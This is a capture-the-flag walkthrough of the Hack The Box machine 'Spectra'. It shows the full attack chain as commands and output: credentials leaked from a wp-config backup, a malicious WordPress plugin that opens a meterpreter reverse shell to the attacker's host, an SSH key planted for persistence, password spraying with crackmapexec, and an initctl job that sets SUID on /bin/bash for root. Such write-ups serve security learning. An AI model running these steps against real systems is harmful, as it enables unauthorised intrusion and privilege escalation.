# Spectra
```
Difficulty: Easy
Operating System: Chromium
Hints: True
```

### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
|:---|:---|:---|:---|
| 1 | `administrator` | Nmap, Dirb, Credential Reuse | An Nmap scan revealed ports 22 (SSH), 80 (HTTP), and 3306 (MySQL) were open. The web server on port 80 pointed to the domain `spectra.htb`. Directory enumeration on `spectra.htb/testing/` revealed a `wp-config.php.save` file containing MySQL credentials: `devtest:devteam01`. These credentials were found to be reusable for the WordPress `administrator` user on the `main` site. |
| 2 | `nginx` | WordPress Plugin Upload, Meterpreter | With administrator access to WordPress, a malicious plugin was generated using a public tool and uploaded to the site. The plugin contained a PHP meterpreter reverse shell. The shell was triggered by navigating to the plugin's URL, establishing a meterpreter session as the user `nginx`. |
| 3 | `katie` | Privilege Escalation, Password Reuse | A stable SSH shell was obtained as `nginx` by adding a public key to the user's `authorized_keys` file. A system scan with linPEAS revealed an `/etc/init/autologin.conf` file, which contained a hardcoded password `SummerHereWeCome!!` and indicated a possible password file location. This password was tested against a list of users extracted from `/etc/passwd` using `crackmapexec`, leading to a successful login for the user `katie`. |
| 4 | `root` | `sudo` Misconfiguration, `initctl` | As user `katie`, a new `linPEAS` scan identified a `sudo` misconfiguration allowing `katie` to run `initctl` as root without a password. Furthermore, `katie` was a member of the `developers` group, which had write permissions on several `initctl` configuration files in `/etc/init/`. A malicious `initctl` file was created that would set the SUID bit on `/bin/bash` upon execution. The script was then executed with `sudo initctl start <filename>`, successfully setting the SUID bit. |
| 5 | `root` | Final Flag | The SUID bit on `/bin/bash` allowed `katie` to execute a new bash shell with root privileges by using the command `bash -p`, which was then used to retrieve the final flag. |



## Initial Enumeration
Running nmap scan (TCP) on the target shows the following results:
```bash
Nmap scan report for 10.10.10.229
Host is up (0.051s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.1 (protocol 2.0)
| ssh-hostkey: 
|_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)
80/tcp   open  http       nginx 1.17.4
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.17.4
3306/tcp open  tcpwrapped
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
```
As we can see we have only three pors opened 22, 80, 3306.  
As we can notice ssh is not disclosing any banner reporting the operating system of this box.  
Now, let's jump in into port 80.  
As we open the page we can see two links that redirects to `spectra.htb` now we can add this domain to our `/etc/hosts` file and dig deeper into this site.  
As we can see there are two sub-directories:  `testing/` and `main/` the main directory contains a wordpress site.  
if we run a wpscan against the site, nothing really interesting pop up except a user `administrator` .  
after our `init-target` script runs we can see in the nmap vuln the following interesting finding:  
```bash
|_  /testing/: Potentially interesting folder w/ directory listing
```
since directory listing is enabled we can browse webserver files and hopefully find some creds.  
if we mirror the site, we can instantily see a `wp-config.php.save` file containing the following:  
```php
/** The name of the database for WordPress */              
define( 'DB_NAME', 'dev' );                                

/** MySQL database username */                             
define( 'DB_USER', 'devtest' );                            

/** MySQL database password */                             
define( 'DB_PASSWORD', 'devteam01' );                      

/** MySQL hostname */                                      
define( 'DB_HOST', 'localhost' );       
```
This machine is affected by a password reuse vulnerability, hence using credentials `administrator:devteam01` we can log in into `wp-admin`  

## Foothold
Once we are in as administrator into a wordpress site, generally we could edit the theme and add a reverse shell into the theme pages.  
Unfortunately, this time, we cannot edit theme's pages since we get an upload error.  
Poking around on google we can find a [tool](https://github.com/wetw0rk/malicious-wordpress-plugin) that generates a wordpress plugin to inject a reverse shell. 
```bash
[root@kali malicious-wordpress-plugin (master ✗)]$ python3 wordpwn.py 10.10.14.2 9002 Y
[*] Checking if msfvenom installed
[+] msfvenom installed
[+] Generating plugin script
[+] Writing plugin script to file
[+] Generating payload To file
To use retry middleware with Faraday v2.0+, install `faraday-retry` gem
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of php/base64
php/base64 succeeded with size 1505 (iteration=0)
php/base64 chosen with final size 1505
Payload size: 1505 bytes

[+] Writing files to zip
[+] Cleaning up files
[+] URL to upload the plugin: http://(target)/wp-admin/plugin-install.php?tab=upload
[+] How to trigger the reverse shell :
      ->   http://(target)/wp-content/plugins/malicious/wetw0rk_maybe.php
      ->   http://(target)/wp-content/plugins/malicious/QwertyRocks.php
[+] Launching handler
To use retry middleware with Faraday v2.0+, install `faraday-retry` gem

                                   ___          ____
                               ,-""   `.      < HONK >
                             ,'  _   e )`-._ /  ----
                            /  ,' `-._<.===-'
                           /  /
                          /  ;
              _          /   ;
 (`._    _.-"" ""--..__,'    |
 <_  `-""                     \
  <`-                          :
   (__   <__.                  ;
     `-.   '-.__.      _.'    /
        \      `-.__,-'    _,'
         `._    ,    /__,-'
            ""._\__,'< <____
                 | |  `----.`.
                 | |        \ `.
                 ; |___      \-``
                 \   --<
                  `.`.<
                    `-'



       =[ metasploit v6.2.0-dev                           ]
+ -- --=[ 2223 exploits - 1171 auxiliary - 398 post       ]
+ -- --=[ 864 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Open an interactive Ruby terminal with
irb

[*] Processing wordpress.rc for ERB directives.
resource (wordpress.rc)> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
resource (wordpress.rc)> set PAYLOAD php/meterpreter/reverse_tcp
PAYLOAD => php/meterpreter/reverse_tcp
resource (wordpress.rc)> set LHOST 10.10.14.2
LHOST => 10.10.14.2
resource (wordpress.rc)> set LPORT 9003
LPORT => 9002
resource (wordpress.rc)> exploit
[*] Started reverse TCP handler on 10.10.14.2:9002
```
Once we generated the malicious plugin, we can upload the plugin into wordpress and hit the url `http://spectra.htb/main/wp-content/plugins/malicious/wetw0rk_maybe.php` (ad described in the [tool's README.md](https://github.com/wetw0rk/malicious-wordpress-plugin)) and get a meterpreter session as user nginx.  
```bash
[*] Meterpreter session 1 opened (10.10.14.2:9002 -> 10.10.10.229:40280) at 2022-06-10 16:46:08 +0200

meterpreter > getuid
Server username: nginx
```
Since `nginx` user has it's own home directory, we can drop our ssh key and use a more stable shell:  
```bash
meterpreter > shell                                        
Process 28248 created.                                     
Channel 0 created.                                                              
id                                                         
uid=20155(nginx) gid=20156(nginx) groups=20156(nginx)      
cd /home/nginx/.ssh                    
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDh+6IGegOhoGYFZxnZ7cKOqJMYlPENJ/3LAgv4RNry5n501cBLaHGaWxQ1nV0qVo+FWrHDVr7b5ENgPaUzGQwjT17bEKMOSroHnzwUVnVz438nkntsud4e6Tfngt49jVcwlBj8oi85K4bsB/fTBTYqCxj3isJ9/al287PS8x4eW0PutYfg9BeodRphdvwyQVrchIyW48CqFmHOMP/i7A2+etlBBhpPg6FEjUfiWaXoAN0mg5s8kO/CXc6k6S12EJo3TVserBkF2E6kxClndkdwevR44uY8Y0Qlo/JLNp0ud9/vb5X/1U1nJ2hAZSN5a/jFEsGivqsq95hVqCZOalFjakjMiM3N1Ec9LIeuM2LN/n7IRqTceQqLtszMtvuyB1wp996fPPKOKCOCM0ZpBJYjQuz3Z+ypRWCOt9dB6Pf7OHOSF4aXQm9bImCSC3dxmWU7azvn84oWOCayFt3IPmnp2eI7z48i8OtqA1GhU7+bDk2zLJJ2dQSE1p27k1Kx9ec= root@kali' > authorized_keys     
ls                                                         
authorized_keys   
```
now we can login as `nginx` via ssh.  
```
[root@kali Spectra ]$ ssh -l nginx $TARGET -i keys/id_rsa_nginx                                                       
The authenticity of host '10.10.10.229 (10.10.10.229)' can't be established.                                          
RSA key fingerprint is SHA256:lr0h4CP6ugF2C5Yb0HuPxti8gsG+3UY5/wKjhnjGzLs.                                            
This key is not known by any other names                   
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes                                              
Warning: Permanently added '10.10.10.229' (RSA) to the list of known hosts.                                           
nginx@spectra ~ $ id                                       
uid=20155(nginx) gid=20156(nginx) groups=20156(nginx)    
```
## User
Once we have an initial foothold, following our standard approach, we can run linPEAS looking for possible privilege escalation vectors.    
After we run linPEAS, we can notice an `/etc/init/autologin.conf` file:  
```bash
╔══════════╣ Analyzing Autologin Files (limit 70)
drwxr-xr-x 2 root root 4096 Feb  3  2021 /etc/autologin

-rw-r--r-- 1 root root 978 Feb  3  2021 /etc/init/autologin.conf
# Copyright 2016 The Chromium OS Authors. All rights reserved.
# Use of this source code is governed by a BSD-style license that can be
# found in the LICENSE file.
description   "Automatic login at boot"
author        "chromium-os-dev@chromium.org"
# After boot-complete starts, the login prompt is visible and is accepting
# input.
start on started boot-complete
script
  passwd=
  # Read password from file. The file may optionally end with a newline.
  for dir in /mnt/stateful_partition/etc/autologin /etc/autologin; do
    if [ -e "${dir}/passwd" ]; then
      passwd="$(cat "${dir}/passwd")"
      break
    fi
  done
  if [ -z "${passwd}" ]; then
    exit 0
  fi
  # Inject keys into the login prompt.
  #
  # For this to work, you must have already created an account on the device.
  # Otherwise, no login prompt appears at boot and the injected keys do the
  # wrong thing.
  /usr/local/sbin/inject-keys.py -s "${passwd}" -k enter
end script
```
reading the script we can see that a possible password file may be located in `/mnt/stateful_partition/etc/autologin/passwd` or `/etc/autologin/passwd` .  
```bash
nginx@spectra ~/log $ cat /etc/autologin/passwd
SummerHereWeCome!!
```
since we do not have any user for this password let's extract a list of users from `/etc/passwd` file and crack them using `crackmapexec`.  
```bash
[root@kali Spectra ]$  crackmapexec ssh $TARGET -u system_users.txt -p 'SummerHereWeCome!!'                                                                                                                                                  
SSH         10.10.10.229    22     10.10.10.229     [*] SSH-2.0-OpenSSH_8.1                                           
SSH         10.10.10.229    22     10.10.10.229     [-] root:SummerHereWeCome!! Bad authentication type; allowed types: ['publickey', 'keyboard-interactive']                                                                                
SSH         10.10.10.229    22     10.10.10.229     [-] chronos:SummerHereWeCome!! Bad authentication type; allowed types: ['publickey', 'keyboard-interactive']                                                                             
SSH         10.10.10.229    22     10.10.10.229     [-] nginx:SummerHereWeCome!! Bad authentication type; allowed types: ['publickey', 'keyboard-interactive']                                                                               
SSH         10.10.10.229    22     10.10.10.229     [+] katie:SummerHereWeCome!! 
```
Now we can login as user katie with the discovered password:  
```bash
[root@kali htb-walkthroughs (main ✗)]$ ssh -l katie $TARGET                    
(katie@10.10.10.229) Password: 
-bash-4.3$ whoami
katie
```

## Root
Once we log in, following our standard approach, we can run linPEAS looking for possible privilege escalation vectors.    
After we run linPEAS, we can notice that katie has the following sudo permission:  
```bash
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
User katie may run the following commands on spectra:
    (ALL) SETENV: NOPASSWD: /sbin/initctl
```
additionally katie is part of `developers` group and hence has write permissions on the following `initctl` configuration files:  
```bash
╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)                                                                                                                                                                        
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                                                                                                                                                 
Group developers:                                                                                                   
/etc/init/test6.conf                                                                                                  
/etc/init/test7.conf                                                                                                                                                                                                                         
/etc/init/test3.conf                                                                                                                                                                                                                         
/etc/init/test4.conf                                                                                                  
/etc/init/test.conf
```
Now, we can change the content of, for example `/etc/init/test.conf` file and replace the actual file content with the following:  
```bash
description "Test node.js server"
author      "katie"

start on filesystem or runlevel [2345]
stop on shutdown

script
        chmod +s /bin/bash
end script
```
This will add suid bit to bash, and with suid bit we can run the bash command as root. Now we can execute the above stript by starting the service with:  
```bash
katie@spectra /etc/init $ sudo /sbin/initctl start test
test start/running, process 50538
katie@spectra /etc/init $ ls -l /bin/bash
-rwsr-sr-x 1 root root 551984 Dec 22  2020 /bin/bash
```
Now that we have the suid bit set, we can run `bash` as root using the `-p` flag:  
```
katie@spectra /etc/init $ bash -p
bash-4.3# whoami
root
```
According to the bash manual:  
```
-p  Turned on whenever the real and effective user ids do not match.
    Disables processing of the $ENV file and importing of shell
    functions.  Turning this option off causes the effective uid and
    gid to be set to the real uid and gid.
```
And we get a shell as root.